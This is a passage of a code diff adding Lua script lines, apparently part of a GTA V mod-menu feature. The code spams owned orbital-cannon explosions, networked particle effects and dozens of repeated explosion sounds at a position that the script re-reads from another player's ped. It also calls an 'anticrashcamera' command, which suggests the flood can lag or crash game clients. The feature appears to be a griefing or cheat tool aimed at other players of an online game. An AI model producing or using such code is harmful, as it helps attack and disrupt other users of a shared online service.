+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            CAM.SHAKE_CAM(cam, "GAMEPLAY_EXPLOSION_SHAKE", 1.5)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            menu.trigger_commands("anticrashcamera")
+            util.yield(550)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
